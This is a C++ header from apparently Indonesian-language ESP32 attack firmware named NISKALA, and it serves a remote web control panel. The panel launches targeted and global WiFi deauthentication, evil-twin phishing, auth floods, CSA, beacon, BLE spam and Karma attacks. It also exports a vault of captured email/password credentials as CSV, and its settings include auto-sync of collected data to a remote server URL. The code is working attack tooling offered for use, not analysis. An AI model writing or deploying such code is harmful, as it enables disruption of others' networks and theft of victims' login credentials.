#ifndef WEB_REMOTE_H
#define WEB_REMOTE_H

#include <WebServer.h>
#include <WiFi.h>
#include <Preferences.h>
#include "attack_engine.h"

extern WebServer server;
extern State currentState;
extern void startDeauthEngine();
extern void startBeaconSpam();
extern void startGlobalDeauth();
extern void startProbeSniffer();
extern void startBTSpam();
extern void startEvilTwinWithDeauth();
extern void startAuthFlood();
extern void startCSAAttack();
extern void startKarmaScan();
extern int selectedTemplateIdx;
extern int verifyAttempts;
extern int verifyState;
extern void stopAllAttacks();
extern void stopAttacksKeepWebRemote();
extern uint8_t g_targetBSSID[6];
extern volatile uint8_t g_targetChannel;
extern volatile uint32_t g_packetsSent;
extern volatile uint32_t g_txErrors;
extern String targetSSID;
extern Preferences prefs;
extern int cfg_deauth_burst;
extern int cfg_deauth_reason;
extern int cfg_auth_burst;
extern int cfg_hop_interval_ms;
extern int cfg_beacon_hop_ms;
extern void saveConfig();
extern String cfg_wifi_ssid;
extern String cfg_wifi_pass;
extern String cfg_server_url;
extern int cfg_autosync_min;
extern int readBatteryPercent();
extern TaskHandle_t attackTaskHandle;
extern String cfg_template_url;

inline String jsonEscape(const String& s) {
  String out;
  out.reserve(s.length() + 8);
  for (unsigned int i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '\\') out += "\\\\";
    else if (c == '"') out += "\\\"";
    else if (c == '\n') out += "\\n";
    else if (c == '\r') out += "\\r";
    else if (c == '\t') out += "\\t";
    else if ((unsigned char)c < 0x20) {
      char buf[8];
      snprintf(buf, sizeof(buf), "\\u%04x", (unsigned char)c);
      out += buf;
    } else out += c;
  }
  return out;
}

inline String csvField(const String& s) {
  String out = "\"";
  for (unsigned int i = 0; i < s.length(); i++) {
    if (s[i] == '"') out += "\"\"";
    else out += s[i];
  }
  out += "\"";
  return out;
}

// HTML UI
const char HTML_REMOTE[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>NISKALA Web Control</title>
<style>
body{font-family:sans-serif;background:#121212;color:#fff;margin:0;padding:16px;text-align:center}
h2{color:#00ff00;margin:0 0 8px}
.info{font-size:12px;color:#aaa;margin:0 0 14px}
.btn{display:block;width:100%;padding:14px;margin:10px 0;border:none;border-radius:8px;background:#333;color:#fff;font-size:16px;font-weight:bold;cursor:pointer;text-decoration:none}
.btn:active{background:#555}
.btn-red{background:#b30000}.btn-red:active{background:#ff0000}
.btn-green{background:#006600}.btn-green:active{background:#00aa00}
.mbtn{flex:1;min-width:70px;padding:10px;border:none;border-radius:6px;background:#333;color:#fff;font-size:13px;font-weight:bold;cursor:pointer}
.mbtn.active{background:#006600}
.ap-list{text-align:left;background:#1e1e1e;border-radius:8px;padding:10px;margin-top:16px;max-height:300px;overflow-y:auto}
.ap-item{padding:10px;border-bottom:1px solid #333;cursor:pointer}
.ap-item:hover{background:#333}
.ap-item b{color:#00ff00}
.note{font-size:12px;color:#ffcc00;margin-top:16px;line-height:1.4}
</style></head><body>
<h2>NISKALA Web Control</h2>
<p class="info" id="info">Status: Idle</p>
<canvas id="chart" width="320" height="90" style="width:100%;background:#1e1e1e;border-radius:8px;margin:0 0 12px"></canvas>
<div style="text-align:left;margin:0 0 8px">
<p style="color:#00ff00;font-weight:bold;margin:0 0 4px">MODE ATTACK:</p>
<div style="display:flex;gap:6px;flex-wrap:wrap">
<button class="mbtn" id="m_deauth" onclick="setMode('deauth')">DEAUTH</button>
<button class="mbtn" id="m_evil" onclick="setMode('evil')">EVIL TWIN</button>
<button class="mbtn" id="m_auth" onclick="setMode('auth')">AUTH FLOOD</button>
<button class="mbtn" id="m_csa" onclick="setMode('csa')">CSA</button>
</div>
</div>
<button class="btn btn-green" onclick="scanWifi()">SCAN WIFI</button>
<div id="scanResult" class="ap-list" style="display:none"></div>
<button class="btn btn-red" onclick="stopAll()">STOP ALL</button>
<div style="text-align:left;margin-top:14px">
<p style="color:#00ff00;font-weight:bold;margin:0 0 4px">QUICK START (HP akan putus):</p>
<button class="btn" onclick="start('beacon')">START BEACON SPAM</button>
<button class="btn" onclick="start('global')">START GLOBAL DEAUTH</button>
<button class="btn" onclick="start('probe')">START PROBE SNIFF</button>
<button class="btn" onclick="start('ble')">START BLE SPAM</button>
<button class="btn" onclick="start('karma')">START KARMA</button>
</div>
<div style="text-align:left;margin-top:6px">
<p style="color:#aaa;font-size:13px;margin:0 0 4px">EXPORT DATA:</p>
<a class="btn" href="/api/export/probe" download>Download Probe CSV</a>
<a class="btn" href="/api/export/karma" download>Download Karma CSV</a>
<a class="btn" href="/api/export/passwords" download>Download Passwords CSV</a>
</div>
<div style="text-align:left;margin-top:14px;background:#1e1e1e;border-radius:8px;padding:12px">
<p style="color:#00ff00;font-weight:bold;margin:0 0 8px">CONFIG ATTACK</p>
<label style="font-size:12px;color:#aaa">Deauth burst</label>
<input id="cfg_deauth" type="number" min="1" max="100" style="width:100%;padding:8px;margin:4px 0 10px;border:none;border-radius:5px;background:#333;color:#fff;font-size:14px">
<label style="font-size:12px;color:#aaa">Auth burst</label>
<input id="cfg_auth" type="number" min="1" max="200" style="width:100%;padding:8px;margin:4px 0 10px;border:none;border-radius:5px;background:#333;color:#fff;font-size:14px">
<label style="font-size:12px;color:#aaa">Hop interval (ms)</label>
<input id="cfg_hop" type="number" min="20" max="2000" style="width:100%;padding:8px;margin:4px 0 10px;border:none;border-radius:5px;background:#333;color:#fff;font-size:14px">
<label style="font-size:12px;color:#aaa">Beacon hop (ms)</label>
<input id="cfg_beacon" type="number" min="20" max="2000" style="width:100%;padding:8px;margin:4px 0 10px;border:none;border-radius:5px;background:#333;color:#fff;font-size:14px">
<label style="font-size:12px;color:#aaa">Deauth reason (0=rotasi)</label>
<input id="cfg_reason" type="number" min="0" max="16" style="width:100%;padding:8px;margin:4px 0 10px;border:none;border-radius:5px;background:#333;color:#fff;font-size:14px">
<label style="font-size:12px;color:#aaa">WiFi SSID (untuk sync)</label>
<input id="cfg_wifi" type="text" style="width:100%;padding:8px;margin:4px 0 10px;border:none;border-radius:5px;background:#333;color:#fff;font-size:14px">
<label style="font-size:12px;color:#aaa">WiFi Password</label>
<input id="cfg_wifipass" type="password" style="width:100%;padding:8px;margin:4px 0 10px;border:none;border-radius:5px;background:#333;color:#fff;font-size:14px">
<label style="font-size:12px;color:#aaa">Server URL</label>
<input id="cfg_url" type="text" placeholder="https://domain/sync.php" style="width:100%;padding:8px;margin:4px 0 10px;border:none;border-radius:5px;background:#333;color:#fff;font-size:14px">
<label style="font-size:12px;color:#aaa">Template URL (hosting)</label>
<input id="cfg_tpl" type="text" placeholder="https://domain/template.html" style="width:100%;padding:8px;margin:4px 0 10px;border:none;border-radius:5px;background:#333;color:#fff;font-size:14px">
<label style="font-size:12px;color:#aaa">Auto-sync (menit, 0=off)</label>
<input id="cfg_autosync" type="number" min="0" max="1440" style="width:100%;padding:8px;margin:4px 0 10px;border:none;border-radius:5px;background:#333;color:#fff;font-size:14px">
<button class="btn" onclick="saveConfig()">SAVE CONFIG</button>
</div>
<div class="note">Mulai Deauth = HP terputus dari AP ini. Berhenti pakai tombol board.</div>
<script>
function esc(s){return String(s).replace(/[&<>"']/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];});}
function rssiBar(rssi) {
  const pct = Math.max(0, Math.min(100, (rssi + 90) / 60 * 100));
  const col = pct > 66 ? '#00ff00' : (pct > 33 ? '#ffcc00' : '#ff0000');
  return '<div style="height:6px;background:#333;border-radius:3px;margin-top:4px"><div style="height:6px;width:' + pct + '%;background:' + col + ';border-radius:3px"></div></div>';
}
let attackMode = 'deauth';
function setMode(m) {
  attackMode = m;
  ['deauth','evil','auth','csa'].forEach(x => {
    document.getElementById('m_' + x).className = 'mbtn' + (x === m ? ' active' : '');
  });
  document.getElementById('info').innerText = 'Mode: ' + m.toUpperCase();
}
function scanWifi() {
  document.getElementById('info').innerText = 'Status: Scanning...';
  document.getElementById('scanResult').style.display = 'none';
  fetch('/api/scan').then(r => r.json()).then(data => {
    let html = '';
    data.forEach((ap, i) => {
      html += `<div class="ap-item" data-mac="${esc(ap.mac)}" data-ch="${ap.ch}" data-ssid="${esc(ap.ssid)}">
        <b>${esc(ap.ssid)}</b> (Ch: ${ap.ch}) - ${ap.rssi} dBm
        ${rssiBar(ap.rssi)}
      </div>`;
    });
    document.getElementById('scanResult').innerHTML = html;
    document.getElementById('scanResult').style.display = 'block';
    document.getElementById('info').innerText = 'Status: ' + data.length + ' AP ditemukan';
  });
}
function stopAll() {
  fetch('/api/stop').then(() => {
    document.getElementById('info').innerText = 'Status: Stopped';
    document.getElementById('scanResult').style.display = 'none';
  });
}
const pktSamples = [];
function drawChart(data) {
  const c = document.getElementById('chart');
  if (!c) return;
  const ctx = c.getContext('2d');
  const w = c.width, h = c.height;
  ctx.fillStyle = '#1e1e1e'; ctx.fillRect(0, 0, w, h);
  if (data.length < 2) return;
  const max = Math.max.apply(null, data) || 1;
  ctx.strokeStyle = '#00e676'; ctx.lineWidth = 2; ctx.beginPath();
  for (let i = 0; i < data.length; i++) {
    const x = 5 + (i / (data.length - 1)) * (w - 10);
    const y = h - 5 - (data[i] / max) * (h - 10);
    if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
  }
  ctx.stroke();
}
function poll() {
  fetch('/api/status').then(r => r.json()).then(s => {
    document.getElementById('info').innerText = 'mode ' + s.mode + ' | pkt ' + s.packets + ' | err ' + s.txerrors + ' | heap ' + s.heap + 'B | stack ' + (s.stack||0) + 'B | bat ' + (s.battery||0) + '% | t ' + (s.temp||0) + 'C | up ' + s.uptime + 's | ' + s.target;
    pktSamples.push(s.packets);
    if (pktSamples.length > 60) pktSamples.shift();
    drawChart(pktSamples);
  }).catch(() => {});
}
document.getElementById('scanResult').addEventListener('click', function(e) {
  const item = e.target.closest('.ap-item');
  if (!item) return;
  const mac = item.getAttribute('data-mac');
  const ch = item.getAttribute('data-ch');
  const ssid = item.getAttribute('data-ssid');
  document.getElementById('info').innerText = 'Status: Attacking ' + ssid;
  fetch(`/api/attack?mac=${encodeURIComponent(mac)}&ch=${encodeURIComponent(ch)}&ssid=${encodeURIComponent(ssid)}&mode=${encodeURIComponent(attackMode)}`)
    .then(() => alert(attackMode.toUpperCase() + ' dimulai ke ' + ssid));
});
function start(m) {
  document.getElementById('info').innerText = 'Status: Starting ' + m;
  fetch('/api/start/' + m).then(() => alert('Started ' + m + '. HP terputus; stop pakai tombol board.'));
}
function loadConfig() {
  fetch('/api/config').then(r => r.json()).then(c => {
    document.getElementById('cfg_deauth').value = c.deauth;
    document.getElementById('cfg_auth').value = c.auth;
    document.getElementById('cfg_hop').value = c.hop;
    document.getElementById('cfg_beacon').value = c.beacon;
    document.getElementById('cfg_reason').value = c.reason || 0;
    document.getElementById('cfg_wifi').value = c.wifi || '';
    document.getElementById('cfg_wifipass').value = c.wifipass || '';
    document.getElementById('cfg_url').value = c.url || '';
    document.getElementById('cfg_tpl').value = c.tpl || '';
    document.getElementById('cfg_autosync').value = c.autosync || 0;
  }).catch(() => {});
}
function saveConfig() {
  const d = document.getElementById('cfg_deauth').value;
  const a = document.getElementById('cfg_auth').value;
  const h = document.getElementById('cfg_hop').value;
  const b = document.getElementById('cfg_beacon').value;
  const r = document.getElementById('cfg_reason').value;
  const w = document.getElementById('cfg_wifi').value;
  const wp = document.getElementById('cfg_wifipass').value;
  const u = document.getElementById('cfg_url').value;
  const t = document.getElementById('cfg_tpl').value;
  const as = document.getElementById('cfg_autosync').value;
  fetch('/api/config', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'deauth=' + encodeURIComponent(d) + '&auth=' + encodeURIComponent(a) + '&hop=' + encodeURIComponent(h) + '&beacon=' + encodeURIComponent(b) + '&reason=' + encodeURIComponent(r) + '&wifi=' + encodeURIComponent(w) + '&wifipass=' + encodeURIComponent(wp) + '&url=' + encodeURIComponent(u) + '&tpl=' + encodeURIComponent(t) + '&autosync=' + encodeURIComponent(as)
  }).then(() => alert('Config tersimpan'));
}
setMode('deauth');
loadConfig();
setInterval(poll, 2000);
</script>
</body></html>
)rawliteral";

inline void setupWebRemote() {
  // Halaman utama remote control
  server.on("/rc", []() {
    server.send_P(200, "text/html", HTML_REMOTE);
  });

  // Status live untuk UI
  server.on("/api/status", []() {
    String json = "{\"uptime\":" + String(millis() / 1000UL) +
                  ",\"heap\":" + String(ESP.getFreeHeap()) +
                  ",\"packets\":" + String((uint32_t)g_packetsSent) +
                  ",\"txerrors\":" + String((uint32_t)g_txErrors) +
                  ",\"mode\":" + String((int)currentState) +
                  ",\"battery\":" + String(readBatteryPercent()) +
                  ",\"temp\":" + String((int)temperatureRead()) +
                  ",\"stack\":" + String(attackTaskHandle ? (int)uxTaskGetStackHighWaterMark(attackTaskHandle) : 0) +
                  ",\"target\":\"" + jsonEscape(targetSSID) + "\"}";
    server.send(200, "application/json", json);
  });

  // Config attack (read)
  server.on("/api/config", HTTP_GET, []() {
    String json = "{\"deauth\":" + String(cfg_deauth_burst) +
                  ",\"auth\":" + String(cfg_auth_burst) +
                  ",\"hop\":" + String(cfg_hop_interval_ms) +
                  ",\"beacon\":" + String(cfg_beacon_hop_ms) +
                  ",\"reason\":" + String(cfg_deauth_reason) +
                  ",\"wifi\":\"" + jsonEscape(cfg_wifi_ssid) + "\"" +
                  ",\"wifipass\":\"" + jsonEscape(cfg_wifi_pass) + "\"" +
                  ",\"url\":\"" + jsonEscape(cfg_server_url) + "\"" +
                  ",\"tpl\":\"" + jsonEscape(cfg_template_url) + "\"" +
                  ",\"autosync\":" + String(cfg_autosync_min) + "}";
    server.send(200, "application/json", json);
  });

  // Config attack (save)
  server.on("/api/config", HTTP_POST, []() {
    if (server.hasArg("deauth")) cfg_deauth_burst = constrain(server.arg("deauth").toInt(), 1, 100);
    if (server.hasArg("auth"))   cfg_auth_burst = constrain(server.arg("auth").toInt(), 1, 200);
    if (server.hasArg("hop"))    cfg_hop_interval_ms = constrain(server.arg("hop").toInt(), 20, 2000);
    if (server.hasArg("beacon")) cfg_beacon_hop_ms = constrain(server.arg("beacon").toInt(), 20, 2000);
    if (server.hasArg("reason")) cfg_deauth_reason = constrain(server.arg("reason").toInt(), 0, 16);
    if (server.hasArg("wifi")) cfg_wifi_ssid = server.arg("wifi");
    if (server.hasArg("wifipass")) cfg_wifi_pass = server.arg("wifipass");
    if (server.hasArg("url")) cfg_server_url = server.arg("url");
    if (server.hasArg("tpl")) cfg_template_url = server.arg("tpl");
    if (server.hasArg("autosync")) cfg_autosync_min = constrain(server.arg("autosync").toInt(), 0, 1440);
    saveConfig();
    server.send(200, "text/plain", "Config Saved");
  });

  // Scan WiFi
  server.on("/api/scan", []() {
    int n = WiFi.scanNetworks();
    String json = "[";
    for (int i = 0; i < n; i++) {
      if (i > 0) json += ",";
      json += "{\"mac\":\"" + jsonEscape(WiFi.BSSIDstr(i)) + "\",\"ssid\":\"" + jsonEscape(WiFi.SSID(i)) + "\",\"rssi\":" + String(WiFi.RSSI(i)) + ",\"ch\":" + String(WiFi.channel(i)) + "}";
    }
    json += "]";
    server.send(200, "application/json", json);
  });

  // Mulai Deauth ke target
  server.on("/api/attack", []() {
    if (server.hasArg("mac") && server.hasArg("ch") && server.hasArg("ssid")) {
      String macStr = server.arg("mac");
      String ssid = server.arg("ssid");
      g_targetChannel = server.arg("ch").toInt();
      targetSSID = ssid;

      int values[6];
      sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
             &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]);
      for (int i = 0; i < 6; i++) g_targetBSSID[i] = (uint8_t)values[i];

      String mode = server.hasArg("mode") ? server.arg("mode") : "deauth";
      server.send(200, "text/plain", "Attack Started");

      if (mode == "evil") {
        stopAllAttacks();
        selectedTemplateIdx = 0;
        verifyAttempts = 0;
        verifyState = 0;
        currentState = EVIL_TWIN_RUNNING;
        startEvilTwinWithDeauth();
      } else {
        stopAttacksKeepWebRemote();
        currentState = WEB_REMOTE;
        if (mode == "auth") {
          startAuthFlood();
        } else if (mode == "csa") {
          startCSAAttack();
        } else {
          startDeauthEngine();
        }
      }
    } else {
      server.send(400, "text/plain", "Bad Request");
    }
  });

  // Stop semua
  server.on("/api/stop", []() {
    stopAttacksKeepWebRemote();
    currentState = WEB_REMOTE;
    server.send(200, "text/plain", "Stopped");
  });

  // Quick start modul lain
  server.on("/api/start/beacon", []() {
    server.send(200, "text/plain", "Beacon Started");
    stopAttacksKeepWebRemote();
    currentState = WEB_REMOTE;
    startBeaconSpam();
  });
  server.on("/api/start/global", []() {
    server.send(200, "text/plain", "Global Started");
    stopAttacksKeepWebRemote();
    currentState = WEB_REMOTE;
    startGlobalDeauth();
  });
  server.on("/api/start/probe", []() {
    server.send(200, "text/plain", "Probe Started");
    stopAttacksKeepWebRemote();
    currentState = WEB_REMOTE;
    startProbeSniffer();
  });
  server.on("/api/start/ble", []() {
    server.send(200, "text/plain", "BLE Started - WiFi off, Web Remote disconnected");
    stopAllAttacks();
    currentState = BT_SPAM;
    startBTSpam();
  });
  server.on("/api/start/karma", []() {
    server.send(200, "text/plain", "Karma Started");
    stopAttacksKeepWebRemote();
    currentState = WEB_REMOTE;
    startKarmaScan();
  });

  // Export Probe Sniff CSV
  server.on("/api/export/probe", []() {
    String csv = "mac,rssi,ssid\r\n";
    portENTER_CRITICAL(&g_probeLogMux);
    int cnt = g_probeLogCount;
    int head = g_probeLogHead;
    ProbeEntry snap[PROBE_LOG_SIZE];
    for (int i = 0; i < cnt; i++) {
      int idx = (head - cnt + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
      snap[i] = g_probeLog[idx];
    }
    portEXIT_CRITICAL(&g_probeLogMux);
    for (int i = 0; i < cnt; i++) {
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
               snap[i].mac[0], snap[i].mac[1], snap[i].mac[2],
               snap[i].mac[3], snap[i].mac[4], snap[i].mac[5]);
      String ssid = snap[i].ssid[0] ? String(snap[i].ssid) : String("(hidden)");
      csv += String(mac) + "," + String(snap[i].rssi) + "," + csvField(ssid) + "\r\n";
    }
    server.sendHeader("Content-Disposition", "attachment; filename=probe.csv");
    server.send(200, "text/csv", csv);
  });

  // Export Karma CSV
  server.on("/api/export/karma", []() {
    String csv = "ssid,probe_count,auth_count\r\n";
    for (int i = 0; i < g_karmaSSIDCount; i++) {
      csv += csvField(String(g_karmaSSIDs[i].ssid)) + "," + String(g_karmaSSIDs[i].probeCount) + "," + String(g_karmaSSIDs[i].authCount) + "\r\n";
    }
    server.sendHeader("Content-Disposition", "attachment; filename=karma.csv");
    server.send(200, "text/csv", csv);
  });

  // Export Password Vault CSV
  server.on("/api/export/passwords", []() {
    int total = prefs.getInt("pwd_count", 0);
    String csv = "email,password,verified\r\n";
    for (int i = 0; i < total; i++) {
      String entry = prefs.getString(("pwd_" + String(i)).c_str(), "");
      int p1 = entry.indexOf('|');
      String email = (p1 > 0) ? entry.substring(0, p1) : entry;
      String rest = (p1 > 0) ? entry.substring(p1 + 1) : "";
      int p2 = rest.indexOf('|');
      String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
      String ver = (p2 > 0) ? rest.substring(p2 + 1) : "";
      csv += csvField(email) + "," + csvField(pass) + "," + ver + "\r\n";
    }
    server.sendHeader("Content-Disposition", "attachment; filename=passwords.csv");
    server.send(200, "text/csv", csv);
  });
}

#endif
